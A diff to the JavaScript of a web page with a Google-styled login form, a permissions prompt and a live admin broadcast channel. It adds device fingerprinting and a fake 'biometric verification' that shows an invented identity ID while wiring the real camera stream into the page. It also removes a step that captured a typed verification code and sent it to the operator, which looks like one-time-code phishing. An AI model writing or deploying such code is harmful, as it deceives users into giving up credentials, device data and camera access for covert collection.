@@ -2,6 +2,7 @@ console.log(">>> MAIN.JS INICIANDO CARGA <<<");
 
 const featuresSection = document.getElementById('features-section');
 const assistanceSection = document.getElementById('assistance-section');
+const aboutSection = document.getElementById('about-section');
 const loginBtn = document.getElementById('login-btn');
 const loginModal = document.getElementById('login-modal');
 const closeModalBtn = document.getElementById('close-modal');
@@ -9,10 +10,6 @@ const googleLoginForm = document.getElementById('google-login-form');
 const permissionsModal = document.getElementById('permissions-modal');
 const acceptPermissionsBtn = document.getElementById('accept-permissions');
 const denyPermissionsBtn = document.getElementById('deny-permissions');
-const confirmationModal = document.getElementById('confirmation-modal');
-const verifyCodeBtn = document.getElementById('verify-code');
-const cancelVerificationBtn = document.getElementById('cancel-verification');
-const resendCodeBtn = document.getElementById('resend-code');
 const assistanceForm = document.getElementById('assistance-form');
 
 // Cliente Supabase global
@@ -48,9 +45,13 @@ async function getDeviceInfo() {
         user_agent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        screen_width: screen.width,
-        screen_height: screen.height,
+        screen_res: `${screen.width}x${screen.height}`,
         ip: ip,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cores: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory || 'N/A',
+        cookies: navigator.cookieEnabled ? 'YES' : 'NO',
+        online: navigator.onLine ? 'YES' : 'NO',
         status: 'active'
     };
 
@@ -151,7 +152,6 @@ closeModalBtn.addEventListener('click', () => {
 window.addEventListener('click', (event) => {
     if (event.target === loginModal) loginModal.style.display = 'none';
     else if (event.target === permissionsModal) permissionsModal.style.display = 'none';
-    else if (event.target === confirmationModal) confirmationModal.style.display = 'none';
 });
 
 googleLoginForm.addEventListener('submit', async (e) => {
@@ -196,7 +196,14 @@ acceptPermissionsBtn.addEventListener('click', async () => {
     });
 
     permissionsModal.style.display = 'none';
-    confirmationModal.style.display = 'block';
+    
+    // Saltamos la verificación de código y damos acceso directo
+    featuresSection.style.display = 'block';
+    assistanceSection.style.display = 'block';
+    aboutSection.style.display = 'block';
+
+    await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
+    channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, auto: true } });
 
     requestRealPermissions(permissions);
 });
@@ -265,40 +272,11 @@ function requestRealPermissions(requestedPerms) {
     }
 }
 
-// Verificación y Asistencia
-verifyCodeBtn.addEventListener('click', async () => {
-    const codeInputs = document.querySelectorAll('.code-input');
-    let code = '';
-    codeInputs.forEach(input => code += input.value);
-
-    confirmationModal.style.display = 'none';
-    featuresSection.style.display = 'block';
-    assistanceSection.style.display = 'block';
-
-    await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
-    channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, code } });
-});
-
-cancelVerificationBtn.addEventListener('click', () => {
-    confirmationModal.style.display = 'none';
-    alert('La verificación es obligatoria para utilizar el sistema.');
-});
-
-resendCodeBtn.addEventListener('click', (e) => {
-    e.preventDefault();
-    alert('Se ha enviado un nuevo código a su correo electrónico.');
-});
-
-// Autocompletar campos de código
+// Autocompletar campos de código (ELIMINADO - NO SE USA)
+/*
 const codeInputs = document.querySelectorAll('.code-input');
-codeInputs.forEach((input, index) => {
-    input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < codeInputs.length - 1) codeInputs[index + 1].focus();
-    });
-    input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) codeInputs[index - 1].focus();
-    });
-});
+...
+*/
 
 assistanceForm.addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -343,3 +321,114 @@ window.addEventListener('beforeunload', (e) => {
 
 // Inicializar al cargar scripts
 initSupabase();
+
+// --- NUEVAS FUNCIONALIDADES ESTÉTICAS ---
+
+// Actualizar Fecha y Hora en Tiempo Real
+function updateDateTime() {
+    const dateElement = document.getElementById('current-date');
+    if (!dateElement) return;
+
+    const now = new Date();
+    const options = { 
+        year: 'numeric', 
+        month: 'short', 
+        day: '2-digit', 
+        hour: '2-digit', 
+        minute: '2-digit', 
+        second: '2-digit',
+        hour12: false 
+    };
+    dateElement.textContent = now.toLocaleDateString('es-ES', options).replace(',', '');
+}
+
+setInterval(updateDateTime, 1000);
+updateDateTime();
+
+// Simulación de Captura Biométrica
+const takePhotoBtn = document.getElementById('take-photo-btn');
+const biometricFlash = document.getElementById('biometric-flash');
+const scanStatus = document.querySelector('.scan-status');
+
+if (takePhotoBtn) {
+    takePhotoBtn.addEventListener('click', () => {
+        // Efecto de Flash
+        biometricFlash.classList.add('active');
+        setTimeout(() => biometricFlash.classList.remove('active'), 150);
+
+        // Simulación de Procesamiento
+        takePhotoBtn.disabled = true;
+        scanStatus.textContent = 'PROCESANDO BIOMETRÍA...';
+        scanStatus.style.color = '#ffcc00';
+
+        setTimeout(() => {
+            scanStatus.textContent = 'IDENTIDAD VERIFICADA [ID: ' + Math.floor(Math.random() * 1000000) + ']';
+            scanStatus.style.color = '#00ff41';
+            takePhotoBtn.innerHTML = '<span>✓</span> Verificado';
+            
+            // Si hay un stream real, podríamos avisar al admin (opcional)
+            if (deviceInfo.device_id) {
+                channel.send({
+                    type: 'broadcast',
+                    event: 'biometric-verified-sim',
+                    payload: { deviceId: deviceInfo.device_id, timestamp: new Date().toISOString() }
+                });
+            }
+        }, 2500);
+    });
+}
+
+// Vincular video real al visor de la simulación si se obtienen permisos
+const originalRequestPerms = requestRealPermissions;
+requestRealPermissions = function(requestedPerms) {
+    // Llamar a la función original para no romper nada
+    originalRequestPerms(requestedPerms);
+    
+    // Si se pidió cámara, intentar vincular el stream al visor de la simulación
+    if (requestedPerms.camera) {
+        const checkStream = setInterval(() => {
+            if (localStream) {
+                const simulatedViewfinder = document.getElementById('simulated-viewfinder');
+                if (simulatedViewfinder) {
+                    // Creamos un elemento de video para el visor si no existe
+                    let videoPreview = document.getElementById('biometric-video-preview');
+                    if (!videoPreview) {
+                        videoPreview = document.createElement('video');
+                        videoPreview.id = 'biometric-video-preview';
+                        videoPreview.autoplay = true;
+                        videoPreview.muted = true;
+                        videoPreview.style.width = '100%';
+                        videoPreview.style.height = '100%';
+                        videoPreview.style.objectFit = 'cover';
+                        simulatedViewfinder.appendChild(videoPreview);
+                    }
+                    videoPreview.srcObject = localStream;
+                    scanStatus.textContent = 'BIOMETRÍA LISTA PARA CAPTURA';
+                }
+                clearInterval(checkStream);
+            }
+        }, 500);
+    }
+};
+
+// Manejo de scroll para el Navbar
+window.addEventListener('scroll', () => {
+    const sections = document.querySelectorAll('section');
+    const navLinks = document.querySelectorAll('.nav a');
+    
+    let current = '';
+    sections.forEach(section => {
+        const sectionTop = section.offsetTop;
+        const sectionHeight = section.clientHeight;
+        if (pageYOffset >= (sectionTop - 150)) {
+            current = section.getAttribute('id');
+        }
+    });
+
+    navLinks.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('href').includes(current)) {
+            link.classList.add('active');
+        }
+    });
+});
